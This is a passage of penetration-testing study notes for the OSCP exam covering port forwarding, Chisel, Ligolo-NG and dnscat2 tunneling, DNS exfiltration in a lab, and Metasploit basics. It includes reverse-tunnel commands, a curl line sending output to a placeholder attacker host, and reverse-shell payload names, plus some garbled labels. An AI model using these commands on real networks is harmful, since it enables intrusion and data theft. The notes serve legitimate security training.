</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4" href="#__codelineno-125-4"></a><span class="n">C</span><span class="p">:\</span><span class="n">tmp</span><span class="p">\</span><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ssh</span> <span class="n">-l</span> <span class="n">kali</span> <span class="n">-pw</span> <span class="p">&lt;</span><span class="n">YOUR</span> <span class="n">PASSWORD</span> <span class="n">HERE</span><span class="p">&gt;</span> <span class="n">-R</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">9389</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">3389</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">118</span><span class="p">.</span><span class="n">4</span>
</span></code></pre></div>
<h4 id="netsh"><strong>Netsh</strong></h4>
<aside>


Netsh require administrative level access

</aside>

<p><strong><em>Netsh Remote Port Forwarding</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="gu">## Remote Port Forwarding using Netsh </span>
</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a>
</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a><span class="gu">## List created connections</span>
</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a>netsh interface portproxy show all
</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a>
</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a><span class="gu">## Add Firewall Rule</span>
</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#__codelineno-126-8"></a>netsh advfirewall firewall add rule name=&quot;port_forward_ssh_2222&quot; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#__codelineno-126-9"></a>
</span><span id="__span-126-10"><a id="__codelineno-126-10" name="__codelineno-126-10" href="#__codelineno-126-10"></a><span class="gu">## Delete Firewall Rule</span>
</span><span id="__span-126-11"><a id="__codelineno-126-11" name="__codelineno-126-11" href="#__codelineno-126-11"></a>netsh advfirewall firewall delete rule name=&quot;port_forward_ssh_2222&quot;
</span><span id="__span-126-12"><a id="__codelineno-126-12" name="__codelineno-126-12" href="#__codelineno-126-12"></a>
</span><span id="__span-126-13"><a id="__codelineno-126-13" name="__codelineno-126-13" href="#__codelineno-126-13"></a><span class="gu">## Delete Port Forward Rule</span>
</span><span id="__span-126-14"><a id="__codelineno-126-14" name="__codelineno-126-14" href="#__codelineno-126-14"></a>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
</span></code></pre></div>
<hr />
<h2 id="tunneling-through-deep-packet-inspection"><strong>Tunneling Through Deep Packet Inspection</strong></h2>
<h4 id="http-tunneling-with-chisel"><strong>HTTP Tunneling with Chisel</strong></h4>
<p><strong><em>Reverse Socks Port Forwarding</em></strong> </p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a><span class="gu">## Kali - Client</span>
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a>chisel server --port [PORT] --reverse
</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a>
</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4" href="#__codelineno-127-4"></a><span class="gu">## Host A - Server</span>
</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5" href="#__codelineno-127-5"></a>chisel client [KALI_IP]:[PORT] R:socks &gt; /dev/null 2&gt;&amp;1 &amp;
</span></code></pre></div>
<p><strong><em>Read the command output</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a>chisel client [IP]:[PORT] R:socks &amp;&gt; /tmp/output; curl --data <span class="ni">@/tmp/output</span> http://[IP]:[PORT]
</span></code></pre></div>
<p><strong><em>Check the opened ports</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>ss -ntplu
</span></code></pre></div>
<p><a href="https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel">Port Forwarding with C... | 0xBEN | Notes</a></p>
<h4 id="http-tunneling-with-lilogo-ng">HTTP Tunneling with Lilogo-NG</h4>
<p><strong><em>Dynamic Port Forwarding with Ligolo-NG</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>Ligolo-Ng
</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#__codelineno-130-2"></a><span class="gu">## Setting up Ligolo-Ng</span>
</span><span id="__span-130-3"><a id="__codelineno-130-3" name="__codelineno-130-3" href="#__codelineno-130-3"></a>sudo ip tuntap add user root mode tun ligolo
</span><span id="__span-130-4"><a id="__codelineno-130-4" name="__codelineno-130-4" href="#__codelineno-130-4"></a>sudo ip link set ligolo up
</span><span id="__span-130-5"><a id="__codelineno-130-5" name="__codelineno-130-5" href="#__codelineno-130-5"></a>ifconfig
</span><span id="__span-130-6"><a id="__codelineno-130-6" name="__codelineno-130-6" href="#__codelineno-130-6"></a>
</span><span id="__span-130-7"><a id="__codelineno-130-7" name="__codelineno-130-7" href="#__codelineno-130-7"></a><span class="gu">## Attack Host</span>
</span><span id="__span-130-8"><a id="__codelineno-130-8" name="__codelineno-130-8" href="#__codelineno-130-8"></a><span class="k">&gt; </span><span class="ge">./proxy -selfcert</span>
</span><span id="__span-130-9"><a id="__codelineno-130-9" name="__codelineno-130-9" href="#__codelineno-130-9"></a>ligolo-ng&gt; session
</span><span id="__span-130-10"><a id="__codelineno-130-10" name="__codelineno-130-10" href="#__codelineno-130-10"></a>ligolo-ng&gt; ifconfig
</span><span id="__span-130-11"><a id="__codelineno-130-11" name="__codelineno-130-11" href="#__codelineno-130-11"></a>
</span><span id="__span-130-12"><a id="__codelineno-130-12" name="__codelineno-130-12" href="#__codelineno-130-12"></a>sudo ip route add &lt;Pivoting Network Subnet&gt; dev ligolo
</span><span id="__span-130-13"><a id="__codelineno-130-13" name="__codelineno-130-13" href="#__codelineno-130-13"></a>sudo ip route list
</span><span id="__span-130-14"><a id="__codelineno-130-14" name="__codelineno-130-14" href="#__codelineno-130-14"></a>
</span><span id="__span-130-15"><a id="__codelineno-130-15" name="__codelineno-130-15" href="#__codelineno-130-15"></a>ligolo-ng&gt; start
</span><span id="__span-130-16"><a id="__codelineno-130-16" name="__codelineno-130-16" href="#__codelineno-130-16"></a>
</span><span id="__span-130-17"><a id="__codelineno-130-17" name="__codelineno-130-17" href="#__codelineno-130-17"></a><span class="gu">## Target Host</span>
</span><span id="__span-130-18"><a id="__codelineno-130-18" name="__codelineno-130-18" href="#__codelineno-130-18"></a>agent.exe -connect &lt;IP&gt;:11601 -ignore-cert
</span><span id="__span-130-19"><a id="__codelineno-130-19" name="__codelineno-130-19" href="#__codelineno-130-19"></a>
</span><span id="__span-130-20"><a id="__codelineno-130-20" name="__codelineno-130-20" href="#__codelineno-130-20"></a>Reference:
</span><span id="__span-130-21"><a id="__codelineno-130-21" name="__codelineno-130-21" href="#__codelineno-130-21"></a>&lt;https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/&gt;
</span></code></pre></div>
<h4 id="dns-tunneling-fundamentals"><strong>DNS Tunneling Fundamentals</strong></h4>
<p>In most cases, we'll ask a DNS <a href="https://en.wikipedia.org/wiki/Domain_Name_System#Recursive_and_caching_name_server">*recursive resolver</a><em> server for the DNS </em>address record<em>
(<a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#A">*A</a></em> record) of the domain. An <em>A record</em> is a DNS data type that contains an IPv4 address. The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.</p>
<p>Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of <a href="https://en.wikipedia.org/wiki/Root_name_server">*root name servers</a><em> (as of 2022, there are </em>13<em> of them scattered around the <a href="https://en.wikipedia.org/wiki/Root_name_server#Root_server_addresses">world</a>). Its first task is to send a DNS query to one of these root name servers. Because </em><em>example.com</em><em> has the ".com" suffix, the root name server will respond with the address of a DNS name server that's responsible for the </em><em>.com</em><em> <a href="https://en.wikipedia.org/wiki/Top-level_domain"><em>top-level domain</em></a> (TLD). This is known as the </em>TLD name server*.</p>
<p>The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for <strong>example.com</strong>. The TLD name server will respond with the <a href="https://en.wikipedia.org/wiki/Name_server#Authoritative_name_server">*authoritative name server</a><em> for the </em><em>example.com</em>* domain.</p>
<p>The recursive resolver then asks the <strong>example.com</strong> authoritative name server for the IPv4 address of <strong>www.example.com</strong>. The <strong>example.com</strong> authoritative name server replies with the A record for that.</p>
<p><strong><em>Example of query domain</em></strong></p>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%207.png" /></p>
<p><strong><em>In case scenario</em></strong></p>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%208.png" /></p>
<aside>


In the real world, we will have registered the feline.corp domain name ourselves, set up the authoritative name server machine ourselves, and told the domain registrar that this server should be known as the authoritative name server for the feline.corp zone. However, for simplicity in this lab environment, FELINEAUTHORITY is provided pre-configured. In a real deployment, we would need to configure the server and take care of all other peripheral registrations to ensure that any other DNS servers would eventually find our server for all feline.corp requests.

</aside>

<p><strong><em>Configuration file fore Authoritative Name Server</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>kali@felineauthority:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>dns_tunneling
</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a>
</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3" href="#__codelineno-131-3"></a>kali@felineauthority:~/dns_tunneling$<span class="w"> </span>cat<span class="w"> </span>dnsmasq.conf
</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4" href="#__codelineno-131-4"></a><span class="c1">## Do not read /etc/resolv.conf or /etc/hosts</span>
</span><span id="__span-131-5"><a id="__codelineno-131-5" name="__codelineno-131-5" href="#__codelineno-131-5"></a>no-resolv
</span><span id="__span-131-6"><a id="__codelineno-131-6" name="__codelineno-131-6" href="#__codelineno-131-6"></a>no-hosts
</span><span id="__span-131-7"><a id="__codelineno-131-7" name="__codelineno-131-7" href="#__codelineno-131-7"></a>
</span><span id="__span-131-8"><a id="__codelineno-131-8" name="__codelineno-131-8" href="#__codelineno-131-8"></a><span class="c1">## Define the zone</span>
</span><span id="__span-131-9"><a id="__codelineno-131-9" name="__codelineno-131-9" href="#__codelineno-131-9"></a>auth-zone<span class="o">=</span>feline.corp
</span><span id="__span-131-10"><a id="__codelineno-131-10" name="__codelineno-131-10" href="#__codelineno-131-10"></a>auth-server<span class="o">=</span>feline.corp
</span><span id="__span-131-11"><a id="__codelineno-131-11" name="__codelineno-131-11" href="#__codelineno-131-11"></a>
</span><span id="__span-131-12"><a id="__codelineno-131-12" name="__codelineno-131-12" href="#__codelineno-131-12"></a>kali@felineauthority:~/dns_tunneling$<span class="w"> </span>sudo<span class="w"> </span>dnsmasq<span class="w"> </span>-C<span class="w"> </span>dnsmasq.conf<span class="w"> </span>-d
</span><span id="__span-131-13"><a id="__codelineno-131-13" name="__codelineno-131-13" href="#__codelineno-131-13"></a>
</span><span id="__span-131-14"><a id="__codelineno-131-14" name="__codelineno-131-14" href="#__codelineno-131-14"></a>kali@felineauthority:~$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span><span class="o">[</span>interface<span class="o">]</span><span class="w"> </span>udp<span class="w"> </span>port<span class="w"> </span><span class="m">53</span>
</span></code></pre></div>
<p><strong><em>Check the DNS settings using the resolvectl utility</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>resolvectl<span class="w"> </span>status
</span></code></pre></div>
<p><strong><em>Query the subdomain.feline.corp</em></strong></p>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%209.png" /></p>
<p><strong><em>Exfiltrate data through DNS</em></strong> </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>This would require a series of sequential requests. We could convert a
</span><span id="__span-133-2"><a id="__codelineno-133-2" name="__codelineno-133-2" href="#__codelineno-133-2"></a>binary file into a long hex string representation, split this string
</span><span id="__span-133-3"><a id="__codelineno-133-3" name="__codelineno-133-3" href="#__codelineno-133-3"></a>into a series of smaller chunks, then send each chunk in a DNS request
</span><span id="__span-133-4"><a id="__codelineno-133-4" name="__codelineno-133-4" href="#__codelineno-133-4"></a>for **[hex-string-chunk]**.feline.corp. On the server side, we could
</span><span id="__span-133-5"><a id="__codelineno-133-5" name="__codelineno-133-5" href="#__codelineno-133-5"></a>log all the DNS requests and convert them from a series of hex strings
</span><span id="__span-133-6"><a id="__codelineno-133-6" name="__codelineno-133-6" href="#__codelineno-133-6"></a>back to a full binary. We won&#39;t go into further details here, but this
</span><span id="__span-133-7"><a id="__codelineno-133-7" name="__codelineno-133-7" href="#__codelineno-133-7"></a>should clarify the general concept of DNS network exfiltration.
</span></code></pre></div>
<p><strong><em>Infiltrate data through DNS</em></strong> </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>kali@felineauthority:~/dns_tunneling$<span class="w"> </span>cat<span class="w"> </span>dnsmasq_txt.conf
</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a><span class="c1">## Do not read /etc/resolv.conf or /etc/hosts</span>
</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#__codelineno-134-3"></a>no-resolv
</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#__codelineno-134-4"></a>no-hosts
</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#__codelineno-134-5"></a>
</span><span id="__span-134-6"><a id="__codelineno-134-6" name="__codelineno-134-6" href="#__codelineno-134-6"></a><span class="c1">## Define the zone</span>
</span><span id="__span-134-7"><a id="__codelineno-134-7" name="__codelineno-134-7" href="#__codelineno-134-7"></a>auth-zone<span class="o">=</span>feline.corp
</span><span id="__span-134-8"><a id="__codelineno-134-8" name="__codelineno-134-8" href="#__codelineno-134-8"></a>auth-server<span class="o">=</span>feline.corp
</span><span id="__span-134-9"><a id="__codelineno-134-9" name="__codelineno-134-9" href="#__codelineno-134-9"></a>
</span><span id="__span-134-10"><a id="__codelineno-134-10" name="__codelineno-134-10" href="#__codelineno-134-10"></a><span class="c1">## TXT record</span>
</span><span id="__span-134-11"><a id="__codelineno-134-11" name="__codelineno-134-11" href="#__codelineno-134-11"></a>txt-record<span class="o">=</span>www.feline.corp,here<span class="err">&#39;</span>s<span class="w"> </span>something<span class="w"> </span>useful!
</span><span id="__span-134-12"><a id="__codelineno-134-12" name="__codelineno-134-12" href="#__codelineno-134-12"></a>txt-record<span class="o">=</span>www.feline.corp,Base64<span class="w"> </span>or<span class="w"> </span>ASCII<span class="w"> </span>hex<span class="w"> </span>encoded<span class="w"> </span>data
</span><span id="__span-134-13"><a id="__codelineno-134-13" name="__codelineno-134-13" href="#__codelineno-134-13"></a>
</span><span id="__span-134-14"><a id="__codelineno-134-14" name="__codelineno-134-14" href="#__codelineno-134-14"></a>kali@felineauthority:~/dns_tunneling$<span class="w"> </span>sudo<span class="w"> </span>dnsmasq<span class="w"> </span>-C<span class="w"> </span>dnsmasq_txt.conf<span class="w"> </span>-d
</span></code></pre></div>
<p><strong><em>Query to Infiltrate data</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>database_admin@pgdatabase01:~$<span class="w"> </span>nslookup<span class="w"> </span>-type<span class="o">=</span>txt<span class="w"> </span>www.feline.corp
</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a>Server:<span class="w">     </span><span class="m">192</span>.168.50.64
</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a>Address:<span class="w">    </span><span class="m">192</span>.168.50.64#53
</span><span id="__span-135-4"><a id="__codelineno-135-4" name="__codelineno-135-4" href="#__codelineno-135-4"></a>
</span><span id="__span-135-5"><a id="__codelineno-135-5" name="__codelineno-135-5" href="#__codelineno-135-5"></a>Non-authoritative<span class="w"> </span>answer:
</span><span id="__span-135-6"><a id="__codelineno-135-6" name="__codelineno-135-6" href="#__codelineno-135-6"></a>www.feline.corp<span class="w"> </span><span class="nv">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;here&#39;s something useful!&quot;</span>
</span><span id="__span-135-7"><a id="__codelineno-135-7" name="__codelineno-135-7" href="#__codelineno-135-7"></a>www.feline.corp<span class="w"> </span><span class="nv">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Base64 or ASCII hex encoded data&quot;</span>
</span></code></pre></div>
<h4 id="dns-tunneling-with-dnscat2"><strong>DNS Tunneling with dnscat2</strong></h4>
<aside>


A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

</aside>

<p><strong><em>DNS Tunneling with dnscat2</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a><span class="gu">## Server </span>
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a>kali@felineauthority:~$ dnscat2-server feline.corp
</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3" href="#__codelineno-136-3"></a>
</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4" href="#__codelineno-136-4"></a><span class="gu">## Client </span>
</span><span id="__span-136-5"><a id="__codelineno-136-5" name="__codelineno-136-5" href="#__codelineno-136-5"></a>database_admin@pgdatabase01:~$ cd dnscat/
</span><span id="__span-136-6"><a id="__codelineno-136-6" name="__codelineno-136-6" href="#__codelineno-136-6"></a>database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
</span><span id="__span-136-7"><a id="__codelineno-136-7" name="__codelineno-136-7" href="#__codelineno-136-7"></a>
</span><span id="__span-136-8"><a id="__codelineno-136-8" name="__codelineno-136-8" href="#__codelineno-136-8"></a><span class="gu">## DNS Tunelling</span>
</span><span id="__span-136-9"><a id="__codelineno-136-9" name="__codelineno-136-9" href="#__codelineno-136-9"></a>dnscat2&gt; windows
</span><span id="__span-136-10"><a id="__codelineno-136-10" name="__codelineno-136-10" href="#__codelineno-136-10"></a>dnscat2&gt; window -i 1
</span><span id="__span-136-11"><a id="__codelineno-136-11" name="__codelineno-136-11" href="#__codelineno-136-11"></a>dnscat2&gt; ?
</span><span id="__span-136-12"><a id="__codelineno-136-12" name="__codelineno-136-12" href="#__codelineno-136-12"></a>dnscat2&gt; listen 127.0.0.1:[PORT] [REMOTE IP]:[PORT]
</span></code></pre></div>
<hr />
<h2 id="the-metasploit-framework"><strong>The Metasploit Framework</strong></h2>
<h3 id="getting-familiar-with-metasploit"><strong>Getting Familiar with Metasploit</strong></h3>
<p><strong><em>Setup and Work with MSF</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a><span class="gu">## Start the database service</span>
</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a>msfdb init
</span><span id="__span-137-3"><a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a>
</span><span id="__span-137-4"><a id="__codelineno-137-4" name="__codelineno-137-4" href="#__codelineno-137-4"></a><span class="gu">## Enable the database service at boot time</span>
</span><span id="__span-137-5"><a id="__codelineno-137-5" name="__codelineno-137-5" href="#__codelineno-137-5"></a>sudo systemctl enable postgresql
</span><span id="__span-137-6"><a id="__codelineno-137-6" name="__codelineno-137-6" href="#__codelineno-137-6"></a>
</span><span id="__span-137-7"><a id="__codelineno-137-7" name="__codelineno-137-7" href="#__codelineno-137-7"></a><span class="gu">## Verify database connectivity</span>
</span><span id="__span-137-8"><a id="__codelineno-137-8" name="__codelineno-137-8" href="#__codelineno-137-8"></a>msf6 &gt; db_status
</span><span id="__span-137-9"><a id="__codelineno-137-9" name="__codelineno-137-9" href="#__codelineno-137-9"></a>
</span><span id="__span-137-10"><a id="__codelineno-137-10" name="__codelineno-137-10" href="#__codelineno-137-10"></a><span class="gu">## Create a workspace</span>
</span><span id="__span-137-11"><a id="__codelineno-137-11" name="__codelineno-137-11" href="#__codelineno-137-11"></a>msf6 &gt; workplace
</span><span id="__span-137-12"><a id="__codelineno-137-12" name="__codelineno-137-12" href="#__codelineno-137-12"></a>msf6 &gt; workplace -a &quot;OSCP Workplace&quot;
</span><span id="__span-137-13"><a id="__codelineno-137-13" name="__codelineno-137-13" href="#__codelineno-137-13"></a>
</span><span id="__span-137-14"><a id="__codelineno-137-14" name="__codelineno-137-14" href="#__codelineno-137-14"></a><span class="gu">## Nmap scan with msfconsole</span>
</span><span id="__span-137-15"><a id="__codelineno-137-15" name="__codelineno-137-15" href="#__codelineno-137-15"></a>msf6 &gt; db_nmap -sS -sV [target]
</span><span id="__span-137-16"><a id="__codelineno-137-16" name="__codelineno-137-16" href="#__codelineno-137-16"></a>
</span><span id="__span-137-17"><a id="__codelineno-137-17" name="__codelineno-137-17" href="#__codelineno-137-17"></a><span class="gu">## List of all discovered hosts</span>
</span><span id="__span-137-18"><a id="__codelineno-137-18" name="__codelineno-137-18" href="#__codelineno-137-18"></a>msf6 &gt; hosts
</span><span id="__span-137-19"><a id="__codelineno-137-19" name="__codelineno-137-19" href="#__codelineno-137-19"></a>
</span><span id="__span-137-20"><a id="__codelineno-137-20" name="__codelineno-137-20" href="#__codelineno-137-20"></a><span class="gu">## List of all discovered services</span>
</span><span id="__span-137-21"><a id="__codelineno-137-21" name="__codelineno-137-21" href="#__codelineno-137-21"></a>msf6 &gt; services
</span><span id="__span-137-22"><a id="__codelineno-137-22" name="__codelineno-137-22" href="#__codelineno-137-22"></a>msf6 &gt; services -p 445
</span></code></pre></div>
<p><strong><em>Auxiliary Modules</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a><span class="gu">## List all auxiliary modules</span>
</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a>msf6 &gt; show auxiliary
</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a>
</span><span id="__span-138-4"><a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a><span class="gu">## Search for all SMB auxiliary modules</span>
</span><span id="__span-138-5"><a id="__codelineno-138-5" name="__codelineno-138-5" href="#__codelineno-138-5"></a>msf6 &gt; search type:auxiliary smb
</span><span id="__span-138-6"><a id="__codelineno-138-6" name="__codelineno-138-6" href="#__codelineno-138-6"></a>
</span><span id="__span-138-7"><a id="__codelineno-138-7" name="__codelineno-138-7" href="#__codelineno-138-7"></a><span class="gu">## Use module</span>
</span><span id="__span-138-8"><a id="__codelineno-138-8" name="__codelineno-138-8" href="#__codelineno-138-8"></a>msf6 &gt; auxiliary(scanner/smb/smb_version
</span><span id="__span-138-9"><a id="__codelineno-138-9" name="__codelineno-138-9" href="#__codelineno-138-9"></a>
</span><span id="__span-138-10"><a id="__codelineno-138-10" name="__codelineno-138-10" href="#__codelineno-138-10"></a><span class="gu">## Set RHOSTS to all discovered hosts with open port 445</span>
</span><span id="__span-138-11"><a id="__codelineno-138-11" name="__codelineno-138-11" href="#__codelineno-138-11"></a>msf6 auxiliary(scanner/smb/smb_version) &gt; services -p 445 --rhosts
</span><span id="__span-138-12"><a id="__codelineno-138-12" name="__codelineno-138-12" href="#__codelineno-138-12"></a>
</span><span id="__span-138-13"><a id="__codelineno-138-13" name="__codelineno-138-13" href="#__codelineno-138-13"></a><span class="gu">## Check detected vulnerabilities based on the results of run modules</span>
</span><span id="__span-138-14"><a id="__codelineno-138-14" name="__codelineno-138-14" href="#__codelineno-138-14"></a>msf6 auxiliary(scanner/smb/smb_version) &gt; vulns
</span><span id="__span-138-15"><a id="__codelineno-138-15" name="__codelineno-138-15" href="#__codelineno-138-15"></a>
</span><span id="__span-138-16"><a id="__codelineno-138-16" name="__codelineno-138-16" href="#__codelineno-138-16"></a><span class="gu">## Display all valid credentials we gathered</span>
</span><span id="__span-138-17"><a id="__codelineno-138-17" name="__codelineno-138-17" href="#__codelineno-138-17"></a>msf6 auxiliary(scanner/ssh/ssh_login) &gt; creds
</span></code></pre></div>
<p><strong><em>Exploit Modules</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a><span class="gu">## Search modules for Apache 2.4.49</span>
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a>msf6 &gt; search Apache 2.4.49
</span></code></pre></div>
<h3 id="using-metasploit-payloads"><strong>Using Metasploit Payloads</strong></h3>
<p><strong><em>Staged vs Non-Staged Payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a><span class="gu">## The &quot;/&quot; character is used to denote whether a payload is staged or not</span>
</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a><span class="gu">## Staged payload are more stealth</span>
</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a>
</span><span id="__span-140-4"><a id="__codelineno-140-4" name="__codelineno-140-4" href="#__codelineno-140-4"></a><span class="gu">## Staged payload example</span>
</span><span id="__span-140-5"><a id="__codelineno-140-5" name="__codelineno-140-5" href="#__codelineno-140-5"></a>payload/linux/x64/shell/reverse_tcp
</span><span id="__span-140-6"><a id="__codelineno-140-6" name="__codelineno-140-6" href="#__codelineno-140-6"></a>
</span><span id="__span-140-7"><a id="__codelineno-140-7" name="__codelineno-140-7" href="#__codelineno-140-7"></a><span class="gu">## Non-staged payload example</span>
</span><span id="__span-140-8"><a id="__codelineno-140-8" name="__codelineno-140-8" href="#__codelineno-140-8"></a>payload/linux/x64/shell_reverse_tcp 
</span></code></pre></div>
<p><strong><em>Meterpreter Payload</em></strong></p>
<aside>


Note that all Meterpreter payloads are staged

</aside>

<p><strong><em>Meterpreter Payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a><span class="gu">## Note that all Meterpreter payloads are staged</span>
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a>
</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a><span class="gu">## Stealth </span>
</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a>payload/linux/x64/meterpreter_reverse_tcp
</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5" href="#__codelineno-141-5"></a>
</span><span id="__span-141-6"><a id="__codelineno-141-6" name="__codelineno-141-6" href="#__codelineno-141-6"></a><span class="gu">## Not Stealth - Generate some traffic over the network</span>
</span><span id="__span-141-7"><a id="__codelineno-141-7" name="__codelineno-141-7" href="#__codelineno-141-7"></a>payload/linux/x64/meterpreter/reverse_tcp
</span><span id="__span-141-8"><a id="__codelineno-141-8" name="__codelineno-141-8" href="#__codelineno-141-8"></a>
</span><span id="__span-141-9"><a id="__codelineno-141-9" name="__codelineno-141-9" href="#__codelineno-141-9"></a><span class="gu">## Moving through shell sessions</span>
</span><span id="__span-141-10"><a id="__codelineno-141-10" name="__codelineno-141-10" href="#__codelineno-141-10"></a>meterpreter &gt; shell
